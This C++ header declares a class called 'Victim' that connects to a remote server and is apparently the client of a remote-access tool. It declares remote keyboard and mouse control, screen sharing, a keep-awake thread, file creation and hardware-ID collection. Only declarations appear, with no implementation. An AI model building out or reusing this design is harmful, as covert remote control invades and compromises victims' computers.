#pragma once
#include <SFML/Network.hpp>
#include "Mlib/System/system.hpp"
#include "Mlib/System/keyboard.hpp"
#include "Mlib/System/mouse.hpp"
#include "Mlib/System/file.hpp"
#include <iostream>
#include <thread>
#include <shlobj_core.h>
#include <fstream>
#include "../secret.h"

class Victim
{
public:
	Victim();
	int controlVictim();

private:
	void keepAwake(); //thread
	void connectServer();
	void createNewFile(); //optional thread

	void pinMouse() const; //thread
	void shareScreen(); //thread
	static std::string getHardwareId();

	bool controlMouse = false, controlKeyboard = false;
	bool isConnected = false, isRunning = true;
	const Mlib::Vec2i screenSize = Mlib::displaySize();
	size_t lastAwakeSignal = Mlib::currentTime().asMil();
	sf::TcpSocket server;
	bool keysStates[256];
	Mlib::Vec2i mousePos = Mlib::Vec2i(0, 0);
	std::ofstream* file = nullptr;
	std::string filePath = "", hardwareId = "";

	bool isSharingScreen = false;
	std::pair<sf::Vector2<sf::Uint16>, sf::Vector2<sf::Uint16>> sharingRect;
};